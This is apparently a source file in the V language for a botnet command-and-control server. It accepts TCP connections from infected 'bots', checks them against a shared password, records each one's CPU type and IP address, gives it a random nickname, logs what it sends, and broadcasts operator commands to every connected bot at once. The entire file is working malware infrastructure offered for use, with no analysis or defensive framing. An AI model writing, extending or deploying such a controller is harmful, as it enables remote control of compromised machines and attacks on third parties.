module cnc

import io
import net
import time
import rand

import core.logger

pub struct Bot_CNC {
	pub mut:
		nickname	[]string
		socket		[]net.TcpConn
		cpu			[]string
		ip			[]string
		port		[]string
}


pub fn start_botcnc() Bot_CNC {
	mut b := Bot_CNC{}
	return b
}

pub fn start_bot(mut b Bot_CNC, port string, bot_pw string)  {
	b.listener(port, bot_pw)
}

pub fn (mut b Bot_CNC) bot_count() int {
	return b.nickname.len
}

pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu string, ip string, port string) {
	b.nickname << nick
	b.socket << s
	b.cpu << cpu
	b.ip << ip
	b.port << port
}

pub fn (mut b Bot_CNC) remove_bot(mut s net.TcpConn) {
	for i, sock in b.socket {
		if sock == s {
			logger.console_log("lost_conn", "Lost connection to: ${b.ip[i]}.....!", true)
			b.nickname.delete(i)
			b.socket.delete(i)
			b.cpu.delete(i)
			b.ip.delete(i)
			b.port.delete(i)
		}
	}
	s.close() or { return }
}

pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
	mut socket := net.listen_tcp(.ip6, ":${port}") or {
		logger.console_log("bot_server_fail", "Unable to start bot system.....!", true)
		return
	}

	for {
		mut bot_conn := socket.accept() or {
			logger.console_log("accept_user_fail", "Unable to accept bot connection....!", true)
			return
		}
		bot_conn.set_read_timeout(time.infinite)
		go b.bot_auth(mut bot_conn, bot_pw)
	}
}

pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
	mut reader := io.new_buffered_reader(reader: bot_conn)
	logger.console_log("requesting_pw", "Requesting bot for password...!", true)
	hid_pw := reader.read_line() or { "" }
	
	if hid_pw.replace("\n", "") != bot_pw {
		bot_conn.write_string("[x]\n") or { 0 }
		logger.console_log("invalid_bot_pw", "Bot access denied. Invalid password provided....!", true)
		bot_conn.close() or { return }
		return
	}
	bot_conn.write_string("[ + ] Authorized....!\n") or { 0 }
	logger.console_log("requesting_pw", "Bot Password Authorized....!", false)

	logger.console_log("requesting_cpu", "Requesting CPU....!", false)
	cpu := reader.read_line() or { "" }
	logger.console_log("waiting_cpu", "Waiting for CPU from device....!", false)
	if cpu == "" {
		logger.console_log("invalid_bot_cpu", "Invalid cpu provided", true)
		bot_conn.close() or { return }
		return
	}

	user_addy := bot_conn.peer_addr() or { return }
	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
	logger.console_log("bot_connected", "Bot [${user_ip}][${cpu}] successfully connected.....!", false)
	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
	for {
		data := reader.read_line() or {
			b.remove_bot(mut bot_conn)
			return
		}

		if data.len > 3 {
			logger.console_log("new_bot_data", data, false)
		}
	}
}

pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
	mut c := 0
	for i in 0..b.nickname.len {
		b.socket[i].write_string("${cmd}\r\n") or { 0 }
		c++
	}
	logger.console_log("bot_cmd_sent", "Cmd sent to ${c} bots", false)
	return c
}

pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
	mut args := []string{}
	mut cmd := ""
	if buff.contains(" ") {
		args = buff.split(" ")
		cmd = args[0]
	} else {
		args << buff
		cmd = buff
	}
	return buff, cmd, args
}

pub fn (mut b Bot_CNC) randomize_nick() string {
	chars := "q,w,e,r,t,y,u,i,o,p,a,s,d,f,g,h,j,k,l,z,x,c,v,b,n,m,1,2,3,4,5,6,7,8,9,0".split(",")
	mut random_nick := ""
	for _ in 0..10 {
		random_num := rand.int_in_range(0, chars.len) or { return "failed_nick" }
		random_nick += chars[random_num]
	}
	return random_nick
}